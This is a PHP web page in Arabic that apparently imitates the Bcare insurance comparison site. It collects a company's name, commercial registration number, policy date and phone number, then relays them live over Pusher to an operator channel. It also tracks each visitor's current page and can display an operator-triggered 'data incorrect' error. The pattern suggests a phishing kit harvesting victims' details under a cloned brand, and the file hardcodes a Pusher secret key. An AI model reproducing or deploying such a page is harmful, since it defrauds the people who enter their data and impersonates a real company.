<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';


if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'معلومات الطبي');
}

if (isset($_GET['type'])) {
    $type = $_GET['type'];
}

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $site = array(
        'comNum' => $_POST['comNum'],
        'date' => $_POST['date'],
        'phone' => $_POST['phone'],
        'company' => $_POST['company'],

        'page' => 'معلومات الطبي',
        'message' => 'معلومات الطبي',
        'type' => '2'
    );

    $_SESSION['date'] = $_POST['date'];
    $_SESSION['comNum'] = $_POST['comNum'];
    $_SESSION['phone'] = $_POST['phone'];
    $_SESSION['company'] = $_POST['company'];

    $userId = $_SESSION['user_id'];
    $id = $User->UpdateAccount($userId, $site);
    if ($id) {

        $dataUser = [
            'userId' => $userId,
            'updatedData' => $site
        ];

        $pusher->trigger('bcare', 'update-user-accountt', $dataUser);

        echo "<script>document.location.href='medical-companies.php';</script>";
    }
}
if (isset($_GET['reject'])) {
    $showError = true;
}

if (isset($_GET['done'])) {
    $showError1 = true;
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> بي كير للتأمين : أفضل موقع مقارنة تأمين سيارة ومركبات | تأمينك Bcare</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Bootstrap JS (bundle includes Popper.js) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", serif;
            direction: rtl;
        }

        a {
            text-decoration: none;
        }

        /* body {
            height: 2000vh;
        }
         */

        .bacOne {
            background-color: #156394;
        }

        .fa-solid,
        label {
            color: rgb(153, 153, 153);
        }

        label {
            font-weight: bold;
            font-size: 14px;
        }

        .fa-solid.active {
            color: rgb(194, 77, 141) !important;
        }

        .text-primary {
            color: #156394 !important;
        }

        .text-muted {
            color: rgb(153, 153, 153) !important;
        }

        ::placeholder {
            color: #d2d6da !important;
        }

        .bg-two {
            background-color: #156394;
        }

        .form-check-input:checked {
            background-color: orange !important;
            /* Bootstrap primary color or your custom color */
            border-color: orange;
        }

        /* Optional: Change the check mark dot color (on some browsers) */

        .form-check-input {
            width: 1.1em;
            height: 1.1em;
            border: 1px solid gray;
            /* Blue border, 2px thick */
        }

        .group {
            display: flex;
            align-items: center;
            border: 1px solid #dee2e6;
            border-radius: 5px;
            height: 40px;
        }

        .bg-one {
            background-color: #156394;
            height: 40px;
            color: #f8f9fa;
        }

        .bg-o-two {
            height: 40px;
            height: 40px;
            background-color: rgb(240, 240, 240);
            color: rgb(153, 153, 153) !important;
        }

        .bg-a-two {
            height: 40px;
            background-color: rgb(230, 228, 228);
            color: rgb(153, 153, 153) !important;
        }

        .forShow {
            display: flex;
            gap: 10px;
        }

        .ajamaclas {
            display: flex;
            justify-content: start;
            align-items: center;
        }

        .calendar-table td {
            cursor: pointer;
            padding: 10px;
            text-align: center;
        }

        .calendar-table td:hover {
            background-color: #f0f0f0;
        }

        table {
            border: none;
            width: 100%;
            border-collapse: collapse;
        }

        /* Keep only the bottom border of the <thead> */

        thead {
            border-bottom: 1px solid #d2d6da;
            /* Set the bottom border color and thickness */
        }

        /* Remove borders from td and th */

        td,
        th {
            border: none;
            padding: 8px;
            text-align: center;
        }

        tr {
            font-weight: bold;
        }

        th {
            color: rgb(128, 127, 127);
        }

        /* Style for the 'today' cell */

        .today {
            background-color: #156394 !important;
            color: white !important;
            border-radius: 50% !important;
            text-align: center !important;
            padding: 10px !important;
        }

        .btn-warning {
            background-color: #f9a824;
            border-color: #f9a824;
        }

        .disabled {
            color: #ccc;
            pointer-events: none;
        }
    </style>
    <link rel="stylesheet" href="./assets/css/theme.css">
</head>

<body class="bg-light">

    <nav class="d-flex justify-content-center py-2 shadow-sm">
        <a href="index.php">
            <img src="./assets/Bcare-logo.svg" alt="">
        </a>
    </nav>

    <div class="modal show" id="calendarModal" tabindex="-1" aria-labelledby="calendarModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered px-4">
            <div class="modal-content text-center">
                <div class="modal-body">
                    <div class="d-flex justify-content-between align-items-center mb-2">
                        <div>
                            <select id="monthSelect" class="form-select d-none w-auto"></select>
                            <select id="yearSelect" class="form-select d-inline-block w-auto fw-bold" style="border: none;"></select>
                        </div>
                        <div>
                            <button class="btn btn-outline-secondary btn-sm" style="font-size: 20px;font-weight: bolder;border: none;" id="prevMonth">&lt;</button>
                            <button class="btn btn-outline-secondary btn-sm" style="font-size: 20px;font-weight: bolder;border: none;" id="nextMonth">&gt;</button>
                        </div>
                    </div>
                    <table class="table calendar-table">
                        <thead>
                            <tr>
                                <th>Su</th>
                                <th>Mo</th>
                                <th>Tu</th>
                                <th>We</th>
                                <th>Th</th>
                                <th>Fr</th>
                                <th>Sa</th>
                            </tr>
                        </thead>
                        <tbody id="calendarBody"></tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>


    <div class="container pt-4 pb-3">
        <div class="shadow-sm bg-white pt-4" style="border-radius: 15px;">
            <h4 class="text-center text-primary"> معلومات الشركة </h4>
            <form action="" method="POST">

                <div class="mt-3 px-3">

                    <label for="" class="mb-2 mt-3"> إسم الشركة </label>
                    <input type="text" id="ssn" name="company" required class="form-control" placeholder=" إسم الشركة ">

                    <label for="" class="mb-2 mt-3"> رقم السجل التجاري </label>
                    <input type="text" id="ssn1" name="comNum" pattern="[0-9]*" inputmode="numeric" required class="form-control" placeholder="  رقم السجل التجاري  ">

                    <!-- <label for="" class="mb-2 mt-3"> الرقم الموحد للشركة </label>
                    <input type="text" id="ssn2" name="ssn2" pattern="[0-9]*" inputmode="numeric" required class="form-control" placeholder="   الرقم الموحد للشركة   "> -->

                    <label for="" class="mb-2 mt-3"> تاريخ بدء الوثيقة</label>
                    <input type="date" name="date" id="selectedDate" readonly required inputmode="numeric" class="form-control fw-bold text-center text-primary">

                    <label for="" class="mb-2 mt-3"> رقم الجوال </label>
                    <input type="text" id="phone" name="phone" minlength="8" maxlength="10" pattern="[0-9]*" inputmode="numeric" required class="form-control" placeholder="    رقم الجوال  ">


                    <div class="text-center my-4 pb-4">
                        <button type="submit" name="submit" id="butSubm" disabled class="btn btn-warning w-100 text-light fw-bold">متابعة</button>
                    </div>

                </div>
            </form>
        </div>
    </div>

    <div class="container" style="margin-top: 70px;">
        <h5 class="fw-bold text-primary text-center"> طريقك آمــن مع بي كير </h5>
        <div class="row d-flex justify-content-between mt-5">
            <div class="col d-flex flex-column align-items-center shadow-sm p-3 pb-5 gap-2" style="border-radius: 15px;">
                <img src="./assets/insureOneMin.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary text-center fw-bold"> تأمينك في دقيقة </small>
            </div>

            <div class="col d-flex flex-column  shadow-sm p-3 pb-5 align-items-center gap-4" style="border-radius: 15px;">
                <img src="./assets/sprateInsure.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary fw-bold"> فصّل تأمينك </small>
            </div>

            <div class="col d-flex flex-column  align-items-center shadow-sm p-3 pb-5 gap-2" style="border-radius: 15px;">
                <img src="./assets/priceLess.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary fw-bold"> أسعار أقل </small>
            </div>

            <div class="col d-flex flex-column align-items-center shadow-sm p-3 pb-5 gap-2" style="border-radius: 15px;">
                <img src="./assets/sechleInsure.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary fw-bold"> جدول تأمينك </small>
            </div>
        </div>

        <div class="row d-flex justify-content-between mt-2">

            <div class="col d-flex flex-column align-items-center shadow-sm p-3 pb-5 gap-2" style="border-radius: 15px;">
                <img src="./assets/wind.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary text-center fw-bold"> هب ريح </small>
            </div>

            <div class="col d-flex flex-column  shadow-sm p-3 pb-5 align-items-center gap-2" style="border-radius: 15px;">
                <img src="./assets/discounts.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary text-center fw-bold"> خصومات تضبطك </small>
            </div>

            <div class="col d-flex flex-column  align-items-center shadow-sm p-3 pb-5 gap-2" style="border-radius: 15px;">
                <img src="./assets/benfit.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary fw-bold"> منافع تحميك </small>
            </div>

            <div class="col d-flex flex-column align-items-center shadow-sm p-3 pb-5 gap-2" style="border-radius: 15px;">
                <img src="./assets/oneWay.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary fw-bold"> مكان واحد </small>
            </div>
        </div>


    </div>


    <div class="container bg-white py-5" style="margin-top: 70px;">
        <h5 class="fw-bold text-primary text-center"> ليش بي كير خيارك الأول في التأمين؟ </h5>

        <div class="d-flex justify-content-between mt-5">
            <div class="col d-flex flex-column  align-items-center gap-2">
                <img src="./assets/saudi.svg" width="30" alt="">
                <small class="text-primary fw-bold"> منك وفيك </small>
            </div>
            <div class="col d-flex flex-column  align-items-center gap-2">
                <img src="./assets/catalog.svg" width="30" alt="">
                <small class="text-primary fw-bold"> عروض تفهمك </small>
            </div>
        </div>

        <div class="d-flex justify-content-between mt-5">
            <div class="col d-flex flex-column  align-items-center gap-2">
                <img src="./assets/payments_FILL0_wght400_GRAD0_opsz48.svg" width="30" alt="">
                <small class="text-primary fw-bold"> سعر يرضيك </small>
            </div>
            <div class="col d-flex flex-column  align-items-center gap-2">
                <img src="./assets/Group 6518.svg" width="30" alt="">
                <small class="text-primary fw-bold"> إصدار سريع </small>
            </div>
        </div>

        <div class="d-flex justify-content-between mt-5">
            <div class="col d-flex flex-column justify-content-center align-items-center gap-2">
                <img src="./assets/tachometer-alt-fastest.svg" width="30" alt="">
                <small class="text-primary fw-bold"> نقسط تأمينك </small>
            </div>
            <div class="col d-flex flex-column  align-items-center gap-2">
                <img src="./assets/flame.svg" width="30" alt="">
                <small class="text-primary fw-bold"> نفرغ لك </small>
            </div>
        </div>
    </div>


    <footer class="bg-two p-3">
        <img src="./assets/logo-bacre-white.svg" alt="">

        <p class="text-light text-center fw-bold mt-5" style="font-size: 13px;"> 2025 © جميع الحقوق محفوظة، شركة عناية الوسيط لوساطة التأمين </p>
    </footer>

<script src="js/main.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <!-- Error Modal -->
    <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center border-0 shadow-lg" style="border-radius: 24px;">
                <div class="modal-header-error p-5" style="background: #fff5f5;">
                    <div class="error-icon-wrapper mx-auto mb-4" style="width: 70px; height: 70px; background: #fee2e2; color: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">
                        <i class="bi bi-exclamation-triangle-fill"></i>
                    </div>
                    <h5 class="fw-900 text-dark mb-3">المعلومات غير صحيحة</h5>
                    <p class="text-muted small px-3">البيانات المدخلة غير صحيحة، يرجى التأكد من السجل التجاري ورقم الجوال والمحاولة مرة أخرى.</p>
                    <button class="btn w-100 mt-4" data-bs-dismiss="modal" style="background: #f1f5f9; color: #475569; height: 55px; border-radius: 12px; font-weight: 800;">حسناً، فهمت</button>
                </div>
            </div>
        </div>
    </div>
    <script>
        $(document).ready(function() {
            <?php if (isset($showError) && $showError): ?>
            var myModal = new bootstrap.Modal(document.getElementById('errorModal'));
            myModal.show();
            <?php endif; ?>
        });
    </script>

    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id']); ?>;
    </script>
    <script>
        const calendarModal = new bootstrap.Modal(document.getElementById('calendarModal'));
        document.getElementById('selectedDate').valueAsDate = new Date();

        $(document).ready(function() {
            $('#selectedDate').click(function() {
                generateCalendar(currentDate, 'selectedDate');
                calendarModal.show();
            });
        });

        const selectedDateInput = document.getElementById('selectedDate');
        const calendarBody = document.getElementById('calendarBody');
        const monthSelect = document.getElementById('monthSelect');
        const yearSelect = document.getElementById('yearSelect');
        const prevMonthBtn = document.getElementById('prevMonth');
        const nextMonthBtn = document.getElementById('nextMonth');

        const months = [
            'January', 'February', 'March', 'April', 'May', 'June',
            'July', 'August', 'September', 'October', 'November', 'December'
        ];

        const today = new Date();
        const minDate = new Date(today.getFullYear(), today.getMonth(), 1);
        const maxDate = new Date(today.getFullYear(), today.getMonth() + 3, 1);

        let currentDate = new Date(minDate); // start at current month

        // Generate allowed years and months only between minDate and maxDate
        function populateDropdowns() {
            yearSelect.innerHTML = '';
            monthSelect.innerHTML = '';

            const minYear = minDate.getFullYear();
            const maxYear = maxDate.getFullYear();

            for (let y = minYear; y <= maxYear; y++) {
                yearSelect.add(new Option(y, y));
            }

            updateMonthOptions();
        }

        function updateMonthOptions() {
            const selectedYear = parseInt(yearSelect.value);
            monthSelect.innerHTML = '';

            const startMonth = selectedYear === minDate.getFullYear() ? minDate.getMonth() : 0;
            const endMonth = selectedYear === maxDate.getFullYear() ? maxDate.getMonth() : 11;

            for (let m = startMonth; m <= endMonth; m++) {
                const option = new Option(months[m], m);
                monthSelect.add(option);
            }
        }

        function isBeforeMinMonth(date) {
            return (
                date.getFullYear() < minDate.getFullYear() ||
                (date.getFullYear() === minDate.getFullYear() && date.getMonth() < minDate.getMonth())
            );
        }

        function isAfterMaxMonth(date) {
            return (
                date.getFullYear() > maxDate.getFullYear() ||
                (date.getFullYear() === maxDate.getFullYear() && date.getMonth() > maxDate.getMonth())
            );
        }

        function syncDropdowns() {
            yearSelect.value = currentDate.getFullYear();
            updateMonthOptions();
            monthSelect.value = currentDate.getMonth();
        }

        function updateCalendarFromDropdowns() {
            const year = parseInt(yearSelect.value);
            const month = parseInt(monthSelect.value);
            currentDate = new Date(year, month);
            generateCalendar(currentDate);
        }

        prevMonthBtn.addEventListener('click', () => {
            const testDate = new Date(currentDate.getFullYear(), currentDate.getMonth() - 1);
            if (!isBeforeMinMonth(testDate)) {
                currentDate = testDate;
                syncDropdowns();
                generateCalendar(currentDate);
            }
        });

        nextMonthBtn.addEventListener('click', () => {
            const testDate = new Date(currentDate.getFullYear(), currentDate.getMonth() + 1);
            if (!isAfterMaxMonth(testDate)) {
                currentDate = testDate;
                syncDropdowns();
                generateCalendar(currentDate);
            }
        });

        monthSelect.addEventListener('change', updateCalendarFromDropdowns);
        yearSelect.addEventListener('change', () => {
            updateMonthOptions();
            updateCalendarFromDropdowns();
        });

        function generateCalendar(date, inputId) {
            const selectedDateInput = document.getElementById('selectedDate');

            const year = date.getFullYear();
            const month = date.getMonth();

            const firstDay = new Date(year, month, 1);
            const lastDay = new Date(year, month + 1, 0);
            const startDay = firstDay.getDay();
            const totalDays = lastDay.getDate();

            calendarBody.innerHTML = '';

            // Enable/disable prev/next
            prevMonthBtn.disabled = isBeforeMinMonth(new Date(year, month - 1));
            nextMonthBtn.disabled = isAfterMaxMonth(new Date(year, month + 1));

            let row = document.createElement('tr');
            let dayCounter = 1;

            for (let week = 0; week < 6; week++) {
                row = document.createElement('tr');

                for (let dow = 0; dow < 7; dow++) {
                    const cell = document.createElement('td');
                    const cellIndex = week * 7 + dow;
                    const cellDay = cellIndex - startDay + 1;

                    if (cellIndex >= startDay && cellDay <= totalDays) {
                        cell.textContent = cellDay;

                        const cellDate = new Date(year, month, cellDay);

                        const isBeforeToday = (
                            year === today.getFullYear() &&
                            month === today.getMonth() &&
                            cellDay < today.getDate()
                        );

                        // Add circle style for today
                        if (cellDate.toDateString() === today.toDateString()) {
                            cell.classList.add('today');
                            cell.style.backgroundColor = '#3f51b5'; // Circle background
                            cell.style.color = 'white'; // White text
                            cell.style.borderRadius = '50%'; // Circle border
                            cell.style.textAlign = 'center'; // Center the text
                            cell.style.padding = '10px'; // Add some padding for better circle shape
                        }

                        if (isBeforeMinMonth(cellDate) || isAfterMaxMonth(cellDate) || isBeforeToday) {
                            cell.classList.add('disabled');
                        } else {
                            cell.addEventListener('click', () => {
                                const formattedDate = `${year}-${String(month + 1).padStart(2, '0')}-${String(cellDay).padStart(2, '0')}`;
                                selectedDateInput.value = formattedDate;
                                calendarModal.hide();
                            });
                        }
                    } else {
                        cell.textContent = '';
                    }

                    row.appendChild(cell);
                }

                calendarBody.appendChild(row);
            }
        }


        // Initialize on page load
        window.addEventListener('DOMContentLoaded', () => {
            populateDropdowns();
            syncDropdowns();
        });

        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const submitBtn = document.getElementById('butSubm');

            // Listen to input events on all form fields
            form.addEventListener('input', function() {
                if (form.checkValidity()) {
                    submitBtn.disabled = false;
                } else {
                    submitBtn.disabled = true;
                }
            });

            // Also check on page load in case browser autofills
            if (form.checkValidity()) {
                submitBtn.disabled = false;
            } else {
                submitBtn.disabled = true;
            }
        });
    </script>
<?php include 'chat_widget.php'; ?>
</body>

</html>
